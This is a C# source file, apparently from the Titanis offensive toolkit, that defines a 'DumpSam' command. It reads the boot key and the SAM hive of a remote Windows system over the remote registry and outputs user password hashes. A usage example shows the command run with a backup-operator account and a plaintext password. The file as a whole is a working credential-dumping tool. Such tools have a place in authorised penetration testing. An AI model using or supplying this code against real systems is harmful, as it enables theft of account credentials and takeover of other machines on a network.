using System;
using System.Buffers.Binary;
using System.Collections.Generic;
using System.Collections.Immutable;
using System.ComponentModel;
using System.Diagnostics;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using Titanis.Cli;
using Titanis.Winterop.Lsa;
using Titanis.Winterop.Registry;
using Titanis.Winterop.Sam;
using Titanis.Winterop.SamServer;
using Titanis.Winterop.Security;

namespace Titanis.Msrpc.Msrrp.Cli
{
	/// <task category="Registry;Enumeration">Get user hashes from the SAM</task>
	[Command]
	[Description("Dumps the SAM of a remote system")]
	[OutputRecordType(typeof(SamUserHash))]
	[Example("Dump the SAM using a backup operator", "{0} -UserName marks@LUMON -Kdc LUMON-DC1 -Password She's@live!! LUMON-FS1 -BackupSemantics", Tag ="marks_backup")]
	public class DumpSamCommand : RegistryCommand
	{
		protected override async Task<int> RunAsync(RemoteRegistryClient client, CancellationToken cancellationToken)
		{
			var options = this.KeyOptions;

			var systemKey = await LsaStore.ExtractSyskey(client, options, this.Log, cancellationToken);

			var samServer = await SamRegistryServer.Open(
				systemKey,
				client,
				options,
				this.Log,
				cancellationToken);

			var hashes = await samServer.DumpUserHashes(cancellationToken);
			this.WriteRecords(hashes);

			return 0;
		}
	}
}
